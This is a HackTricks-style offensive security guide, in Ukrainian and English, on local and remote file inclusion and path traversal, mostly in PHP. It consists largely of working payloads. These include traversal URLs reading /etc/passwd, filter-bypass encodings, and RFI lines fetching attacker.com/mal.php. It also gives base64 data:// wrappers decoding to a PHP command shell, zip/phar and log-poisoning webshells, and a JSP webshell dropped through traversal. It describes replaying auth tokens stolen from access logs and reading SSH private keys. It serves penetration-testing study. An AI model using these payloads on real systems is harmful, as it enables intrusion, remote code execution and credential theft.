# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** Файл завантажується з віддаленого сервера (Краще: ви можете написати код і сервер його виконає). В php це **відключено** за замовчуванням (**allow_url_include**).\
**Local File Inclusion (LFI):** Сервер завантажує локальний файл.

Уразливість виникає, коли користувач якимось чином може контролювати файл, який буде завантажений сервером.

Уразливі **PHP functions**: require, require_once, include, include_once

Цікавий інструмент для експлуатації цієї уразливості: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Об'єднавши кілька \*nix LFI списків і додавши більше шляхів, я створив цей:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

Спробуйте також змінити `/` на `\`\
Спробуйте також додати `../../../../../`

A list that uses several techniques to find the file /etc/password (to check if the vulnerability exists) can be found [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Об'єднання різних wordlists:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

Спробуйте також змінити `/` на `\`\
Спробуйте також видалити `C:/` і додати `../../../../../`

A list that uses several techniques to find the file /boot.ini (to check if the vulnerability exists) can be found [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Перевірте LFI список для linux.

## Основні LFI та обходи

Усі приклади стосуються Local File Inclusion, але також можуть бути застосовані до Remote File Inclusion (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)/>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences stripped non-recursively
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Bypass додавання додаткових символів у кінець наданого рядка (bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Це **виправлено починаючи з PHP 5.4**

### **Кодування**

Ви можете використовувати нестандартні кодування, такі як double URL encode (та інші):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### З існуючої папки

Можливо, back-end перевіряє шлях до папки:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Дослідження каталогів файлової системи на сервері

Файлову систему сервера можна досліджувати рекурсивно, щоб ідентифікувати каталоги, а не тільки файли, застосувавши певні методи. Цей процес передбачає визначення глибини директорії та перевірку існування конкретних папок. Нижче наведено детальний метод для цього:

1. **Визначте глибину директорії:** Визначте глибину вашої поточної директорії, успішно отримавши файл `/etc/passwd` (застосовується, якщо сервер базується на Linux). Приклад URL може мати таку структуру, що вказує на глибину три:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Перевірте папки:** Додайте назву підозрілої папки (наприклад, `private`) до URL, потім поверніться до `/etc/passwd`. Додатковий рівень директорії вимагає збільшення глибини на один:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Інтерпретація результатів:** Відповідь сервера вказує, чи існує папка:
- **Помилка / Відсутній вивід:** Папка `private`, ймовірно, не існує в вказаному місці.
- **Вміст `/etc/passwd`:** Наявність папки `private` підтверджується.
4. **Рекурсивне дослідження:** Знайдені папки можна додатково перевіряти на наявність підкаталогів або файлів, використовуючи ті самі прийоми або традиційні Local File Inclusion (LFI) методи.

Щоб досліджувати директорії в інших місцях файлової системи, відповідно підлаштуйте payload. Наприклад, щоб перевірити, чи містить `/var/www/` директорію `private` (припускаючи, що поточна директорія має глибину 3), використайте:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation — метод, що використовується для маніпуляції шляхами файлів у веб-застосунках. Його часто використовують для доступу до обмежених файлів, обходячи певні заходи безпеки, які додають додаткові символи в кінець шляхів файлів. Мета — сформувати шлях файлу так, щоб після змін, внесених заходом безпеки, він все одно вказував на потрібний файл.

У PHP різні подання шляху файлу можуть вважатися еквівалентними через особливості файлової системи. Наприклад:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd` і `/etc/passwd/` трактуються як той самий шлях.
- Якщо останні 6 символів — `passwd`, додавання `/` (утворюючи `passwd/`) не змінює цільовий файл.
- Аналогічно, якщо до шляху додається `.php` (наприклад `shellcode.php`), додавання `/.` в кінці не змінює доступний файл.

Наведені приклади демонструють, як використовувати path truncation для доступу до `/etc/passwd` — поширеної цілі через її конфіденційний вміст (інформація про облікові записи користувачів):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
У цих сценаріях кількість traversals, необхідних, може бути близько 2027, але це число може змінюватися залежно від конфігурації сервера.

- **Using Dot Segments and Additional Characters**: Traversal sequences (`../`) у поєднанні з додатковими dot segments та символами можна використовувати для навігації файловою системою, ефективно ігноруючи додані сервером рядки.
- **Determining the Required Number of Traversals**: Методом проб і помилок можна знайти точну кількість `../` послідовностей, потрібних, щоб дістатися до root і потім до `/etc/passwd`, гарантуючи, що будь-які додані рядки (наприклад `.php`) нейтралізовані, але бажаний шлях (`/etc/passwd`) залишається незмінним.
- **Starting with a Fake Directory**: Зазвичай шлях починають з неіснуючого каталогу (наприклад `a/`). Ця техніка використовується як запобіжний захід або щоб задовольнити вимоги логіки розбору шляху сервера.

Коли застосовують path truncation techniques, важливо розуміти поведінку парсингу шляху сервера та структуру файлової системи. Кожен сценарій може вимагати іншого підходу, і часто потрібне тестування, щоб знайти найефективніший метод.

**Цю вразливість виправлено в PHP 5.3.**

### **Filter bypass tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

У php це вимкнено за замовчуванням, оскільки **`allow_url_include`** — **Off.** Для роботи воно повинно бути **On**, і в такому випадку можна include a PHP file з вашого server і отримати RCE:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Якщо з якоїсь причини **`allow_url_include`** є **On**, але PHP **фільтрує** доступ до зовнішніх веб-сторінок, [according to this post](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), ви, наприклад, можете використати data протокол з base64 для декодування b64 PHP-коду та отримати RCE:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> У попередньому коді останній `+.txt` було додано, тому що атакуючому потрібен був рядок, що закінчується на `.txt`, тож рядок закінчується ним, і після b64 decode ця частина поверне лише сміття, а справжній PHP-код буде включений (і, відповідно, виконаний).

Another example **без використання протоколу `php://`** would be:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python кореневий елемент

У python у коді на кшталт цього:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Якщо користувач передає **absolute path** до **`file_name`**, **попередній шлях просто видаляється**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Це передбачувана поведінка згідно з [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Якщо компонент є абсолютним шляхом, усі попередні компоненти відкидаються й об'єднання продовжується з абсолютного компонента.

## Java: список директорій

Схоже, що якщо у вас є Path Traversal в Java і ви **запитуєте директорію** замість файлу, повертається **перелік вмісту директорії**. Наскільки мені відомо (afaik), цього не відбувається в інших мовах.

## Топ 25 параметрів

Ось список топ 25 параметрів, які можуть бути вразливими до local file inclusion (LFI) (з [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI з використанням PHP обгорток і протоколів

### php://filter

PHP фільтри дозволяють виконувати базові **операції модифікації над даними** перед тим, як вони будуть прочитані або записані. Існує 5 категорій фільтрів:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: Видаляє теги з даних (все між символами "<" та ">")
- Note that this filter has disappear from the modern versions of PHP
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : Перетворює в інше кодування(`convert.iconv.<input_enc>.<output_enc>`). Щоб отримати **список усіх кодувань**, що підтримуються, запустіть у консолі: `iconv -l`

> [!WARNING]
> Зловживання фільтром конвертації `convert.iconv.*` дозволяє **генерувати довільний текст**, що може бути корисним для запису довільного тексту або змусити функцію на кшталт include обробляти довільний текст. Для додаткової інформації див. [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: Compress the content (useful if exfiltrating a lot of info)
- `zlib.inflate`: Decompress the data
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Deprecated
- `mdecrypt.*` : Deprecated
- Other Filters
- Running in php `var_dump(stream_get_filters());` you can find a couple of **unexpected filters**:
- `consumed`
- `dechunk`: reverses HTTP chunked encoding
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> Частина "php://filter" нечутлива до регістру
### Використання php filters як oracle для читання довільних файлів

[**In this post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) запропоновано техніку для читання локального файлу без повернення вмісту з сервера. Ця техніка базується на булевому виведенні файлу (символ за символом) із використанням php filters як oracle. Це можливо тому, що php filters можна використовувати, щоб зробити текст достатньо великим, щоб php викинув виняток.

В оригінальному дописі можна знайти детальне пояснення техніки, але тут коротке резюме:

- Use the codec **`UCS-4LE`** to leave leading character of the text at the begging and make the size of string increases exponentially.
- This will be used to generate a **text so big when the initial letter is guessed correctly** that php will trigger an **error**
- The **dechunk** filter will **remove everything if the first char is not an hexadecimal**, so we can know if the first char is hex.
- Це, поєднане з попереднім (та іншими фільтрами залежно від вгаданої літери), дозволить нам вгадувати букву на початку тексту, бачачи, коли ми застосували достатньо трансформацій, щоб вона перестала бути шістнадцятковим символом. Якщо ж це hex, dechunk його не видалить і початковий "бомбовий" ефект спричинить помилку php.
- The codec **convert.iconv.UNICODE.CP930** transforms every letter in the following one (so after this codec: a -> b). This allow us to discovered if the first letter is an `a` for example because if we apply 6 of this codec a->b->c->d->e->f->g the letter isn't anymore a hexadecimal character, therefore dechunk doesn't deleted it and the php error is triggered because it multiplies with the initial bomb.
- Using other transformations like **rot13** at the beginning it’s possible to leak other chars like n, o, p, q, r (and other codecs can be used to move other letters to the hex range).
- When the initial char is a number it’s needed to base64 encode it and leak the 2 first letters to leak the number.
- The final problem is to see **how to leak more than the initial letter**. By using order memory filters like **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** is possible to change the order of the chars and get in the first position other letters of the text.
- And in order to be able to obtain **further data** the idea if to **generate 2 bytes of junk data at the beginning** with **convert.iconv.UTF16.UTF16**, apply **UCS-4LE** to make it **pivot with the next 2 bytes**, and d**elete the data until the junk data** (this will remove the first 2 bytes of the initial text). Continue doing this until you reach the disired bit to leak.

У дописі також опубліковано інструмент для автоматизації цього: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

This wrapper allows to access file descriptors that the process has open. Potentially useful to exfiltrate the content of opened files:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Ви також можете використовувати **php://stdin, php://stdout and php://stderr** для доступу до **файлових дескрипторів 0, 1 і 2** відповідно (не впевнений, як це може бути корисним у атаці)

### zip:// and rar://

Завантажте Zip або Rar файл з PHPShell всередині та отримайте до нього доступ.\
Щоб мати можливість зловживати протоколом rar, його **потрібно спеціально активувати**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Зверніть увагу, що цей протокол обмежений конфігураціями php **`allow_url_open`** та **`allow_url_include`**

### expect://

Expect має бути активований. Ви можете виконати код за допомогою цього:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Вкажіть ваш payload у POST параметрах:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Файл `.phar` можна використати для виконання PHP-коду, коли веб-застосунок використовує функції на кшталт `include` для завантаження файлів. Наведений нижче PHP-приклад демонструє створення файлу `.phar`:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Щоб скомпілювати файл `.phar`, слід виконати наступну команду:
```bash
php --define phar.readonly=0 create_path.php
```
Upon execution, a file named `test.phar` will be created, which could potentially be leveraged to exploit Local File Inclusion (LFI) vulnerabilities.

In cases where the LFI only performs file reading without executing the PHP code within, through functions such as `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, or `filesize()`, exploitation of a deserialization vulnerability could be attempted. This vulnerability is associated with the reading of files using the `phar` protocol.

For a detailed understanding of exploiting deserialization vulnerabilities in the context of `.phar` files, refer to the document linked below:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

Було можливо зловживати **any arbitrary file read from PHP that supports php filters** для отримання RCE. Детальний опис можна [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Дуже коротко: **3 byte overflow** у PHP heap було використано, щоб **alter the chain of free chunks** певного розміру, щоб мати можливість **write anything in any address**, тому було додано хук для виклику **`system`**.\
Було можливо виділяти (alloc) чанки певних розмірів, зловживаючи додатковими php filters.

### More protocols

Check more possible[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Write in memory or in a temporary file (не впевнений, як це може бути корисно в атаці через file inclusion)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Accessing local filesystem
- [http://](https://www.php.net/manual/en/wrappers.http.php) — Accessing HTTP(s) URLs
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Accessing FTP(s) URLs
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Compression Streams
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Find pathnames matching pattern (It doesn't return nothing printable, so not really useful here)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Audio streams (Not useful to read arbitrary files)

## LFI via PHP's 'assert'

Local File Inclusion (LFI) risks in PHP are notably high when dealing with the 'assert' function, which can execute code within strings. This is particularly problematic if input containing directory traversal characters like ".." is being checked but not properly sanitized.

For example, PHP code might be designed to prevent directory traversal like so:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Хоча це має на меті зупинити traversal, це ненавмисно створює вектор для code injection. Щоб скористатися цим для читання вмісту файлу, зловмисник міг би використати:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Аналогічно, для виконання довільних системних команд можна використати:
```plaintext
' and die(system("id")) or '
```
Важливо **URL-encode these payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> Ця техніка доречна у випадках, коли ви **контролюєте** **шлях до файлу** аргументу **PHP function**, яка буде **доступатися до файлу**, але ви не побачите вміст файлу (наприклад простий виклик **`file()`**), і вміст не відображається.

У [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) пояснюється, як blind path traversal можна експлуатувати через PHP filter, щоб **exfiltrate the content of a file via an error oracle**.

Як підсумок, техніка використовує кодування **"UCS-4LE"** щоб зробити вміст файлу таким **великим**, що **PHP function, яка відкриває** файл викличе **помилку**.

Щоб витягнути перший символ, використовується фільтр **`dechunk`** разом з іншими, такими як **base64** або **rot13**, а зрештою застосовуються фільтри **convert.iconv.UCS-4.UCS-4LE** і **convert.iconv.UTF16.UTF-16BE**, щоб розмістити інші символи на початку і вивести їх.

**Функції, які можуть бути вразливими**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Для технічних деталей див. згаданий пост!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

Коли код на сервері, який приймає/завантажує файли, будує шлях призначення, використовуючи дані під контролем користувача (наприклад, ім'я файлу або URL) без канонізації та валідації, сегменти `..` та абсолютні шляхи можуть вийти за межі призначеного каталогу та спричинити довільний запис файлу. Якщо ви можете помістити payload у веб-доступний каталог, зазвичай ви отримуєте unauthenticated RCE, розмістивши webshell.

Типовий робочий процес експлуатації:
- Виявити примітив запису в endpoint або background worker, який приймає шлях/ім'я файлу та записує вміст на диск (наприклад, message-driven ingestion, XML/JSON command handlers, ZIP extractors тощо).
- Визначити веб-доступні каталоги. Загальні приклади:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- Сформувати path traversal шлях, який виводить із призначеного каталогу зберігання в webroot, і помістити туди вміст webshell.
- Перейти до розміщеного payload і виконати команди.

Примітки:
- Вразлива служба, яка виконує запис, може слухати на не-HTTP порту (наприклад, a JMF XML listener на TCP 4004). Основний веб-портал (інший порт) згодом віддасть ваш payload.
- На Java-стеках ці записи файлів часто реалізовані простим конкатенуванням `File`/`Paths`. Відсутність канонізації/allow-listing — основна вразливість.

Generic XML/JMF-style example (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Заходи захисту, що нейтралізують цей клас помилок:
- Перетворювати шлях на канонічний і перевіряти, що він належить дозволеній базовій директорії.
- Відхиляти будь-які шляхи, що містять `..`, абсолютні корені або букви дисків; віддавати перевагу згенерованим іменам файлів.
- Запускати процес запису від імені облікового запису з низькими привілеями і відокремити директорії для запису від коренів, що обслуговуються.

## Remote File Inclusion

Пояснювалось раніше, [**follow this link**](#remote-file-inclusion).

### Via Apache/Nginx log file

Якщо сервер Apache або Nginx є **вразливим до LFI** всередині функції include, ви можете спробувати отримати доступ до **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`**, помістити в **user agent** або в **GET parameter** php shell типу **`<?php system($_GET['c']); ?>`** і включити цей файл

> [!WARNING]
> Зверніть увагу, що **якщо ви використовуєте подвійні лапки** для shell замість **простих лапок**, подвійні лапки будуть змінені на рядок "_**quote;**_", **PHP видасть помилку** і **нічого більше не виконається**.
>
> Також переконайтеся, що ви **вірно записали payload** інакше PHP помилиться щоразу при спробі завантажити лог-файл і у вас не буде другого шансу.

Це також може бути зроблено в інших логах, але **будьте обережні,** код всередині логів може бути URL-encoded і це може зруйнувати Shell. Заголовок **authorisation "basic"** містить "user:password" у Base64 і він декодується у логах. PHPShell можна вставити всередину цього заголовка.\
Інші можливі шляхи логів:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Читайте access logs, щоб зібрати GET-based auth tokens (token replay)

Багато додатків помилково приймають session/auth tokens через GET (наприклад, AuthenticationToken, token, sid). Якщо у вас є path traversal/LFI-примітив для доступу до web server logs, ви можете вкрасти ці токени з access logs і replay-нути їх, щоб повністю обійти authentication.

How-to:
- Використайте traversal/LFI для читання web server access log. Типові розташування:
- /var/log/apache2/access.log, /var/log/httpd/access_log
- /var/log/nginx/access.log
- Деякі endpoints повертають читання файлів у вигляді Base64. Якщо так, декодуйте локально і перегляньте рядки логів.
- Grep-ніть по GET-запитах, які містять параметр token, витягніть його значення і replay-ніть його проти точки входу додатку.

Example flow (generic):
```http
GET /vuln/asset?name=..%2f..%2f..%2f..%2fvar%2flog%2fapache2%2faccess.log HTTP/1.1
Host: target
```
Декодуйте тіло, якщо воно у Base64, потім відтворіть захоплений token:
```http
GET /portalhome/?AuthenticationToken=<stolen_token> HTTP/1.1
Host: target
```
Примітки:
- Tokens у URLs логуються за замовчуванням; ніколи не приймайте bearer tokens через GET у production-системах.
- Якщо додаток (app) підтримує кілька token names, шукайте загальні ключі, як AuthenticationToken, token, sid, access_token.
- Замініть будь-які tokens, які могли have leaked у logs.

### Via Email

**Відправте лист** на внутрішній акаунт (user@localhost), який містить ваш PHP payload, наприклад `<?php echo system($_REQUEST["cmd"]); ?>`, і спробуйте include пошту користувача з шляхом на кшталт **`/var/mail/<USERNAME>`** або **`/var/spool/mail/<USERNAME>`**

### Via /proc/*/fd/*

1. Upload a lot of shells (for example : 100)
2. Include [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), with $PID = PID of the process (can be brute forced) and $FD the file descriptor (can be brute forced too)

### Via /proc/self/environ

Як і у log file, відправте payload в User-Agent — він відобразиться у файлі /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Через завантаження

Якщо ви можете завантажити файл, просто впровадьте shell payload у нього (наприклад: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Щоб файл залишався читабельним, краще вбудувати його в метадані зображень/doc/pdf

### Через завантаження ZIP-файлу

Завантажте ZIP-файл, що містить стиснутий PHP shell, і отримайте доступ:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Через PHP sessions

Перевірте, чи вебсайт використовує PHP Session (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
У PHP ці сесії зберігаються в _/var/lib/php5/sess\\_\[PHPSESSID]\_ файлах
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Встановіть cookie як `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Використайте LFI, щоб include PHP session file
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Via ssh

Якщо ssh активний, перевірте, який користувач використовується (/proc/self/status & /etc/passwd) і спробуйте отримати доступ до **\<HOME>/.ssh/id_rsa**

### **Via** **vsftpd** _**logs**_

Логи для FTP-сервера vsftpd знаходяться в _**/var/log/vsftpd.log**_. У випадку, якщо існує вразливість Local File Inclusion (LFI) і можливий доступ до відкритого vsftpd-сервера, можна розглянути такі кроки:

1. Інжектуйте PHP payload у поле username під час процесу входу.
2. Після інжекції скористайтеся LFI, щоб отримати логи сервера з _**/var/log/vsftpd.log**_.

### Via php base64 filter (using base64)

Як показано в [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) статті, PHP base64 filter просто ігнорує Non-base64. Ви можете використати це, щоб обійти перевірку file extension: якщо ви подаєте base64, що закінчується на ".php", фільтр просто проігнорує "." і додасть "php" до base64. Ось приклад payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Через php filters (без файлу)

This [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) пояснює, що ви можете використовувати **php filters щоб згенерувати довільний вміст** як вихід. Це, по суті, означає, що ви можете **згенерувати довільний php code** для include **не записуючи** його у файл.


{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Через segmentation fault

**Завантажте** файл, який буде збережений як **тимчасовий** у `/tmp`, потім в **тому ж запиті** спричиніть **segmentation fault**, і тоді **тимчасовий файл не буде видалений** — ви зможете його знайти.


{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Через Nginx тимчасове збереження файлів

Якщо ви знайшли **Local File Inclusion** і **Nginx** працює перед PHP, ви можете отримати RCE за допомогою наступної техніки:


{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Через PHP_SESSION_UPLOAD_PROGRESS

Якщо ви знайшли **Local File Inclusion**, навіть якщо у вас **немає сесії** і `session.auto_start` встановлено в `Off`. Якщо ви передасте **`PHP_SESSION_UPLOAD_PROGRESS`** у **multipart POST** даних, PHP **увімкне сесію для вас**. Ви можете зловживати цим, щоб отримати RCE:


{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Через завантаження тимчасових файлів у Windows

Якщо ви знайшли **Local File Inclusion**, і сервер працює на **Windows**, ви можете отримати RCE:


{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Через `pearcmd.php` + URL args

